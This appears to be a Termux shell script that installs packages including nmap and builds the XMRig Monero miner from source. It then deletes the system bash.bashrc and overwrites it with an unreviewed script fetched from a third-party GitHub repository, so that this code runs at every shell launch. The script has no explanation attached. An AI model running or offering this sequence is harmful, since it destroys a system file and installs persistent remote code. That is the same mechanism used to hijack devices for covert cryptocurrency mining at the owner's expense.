apt update && yes | apt upgrade && apt update && apt install git -y && pkg install wget -y && pkg install nmap -y && pkg install wget -y && apt-get install git && pkg install git && apt -y install neofetch
pkg install git build-essential cmake -y
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build
cd xmrig/build
cmake .. -DWITH_HWLOC=OFF && make -j$(nproc)
cd && pwd && cd ../usr/etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/manh-mobile-0898707968/bash.bitcoin/refs/heads/main/xmr.bash
cp xmr.bash ../etc/bash.bashrc
rm -rf xmr.bash
exit
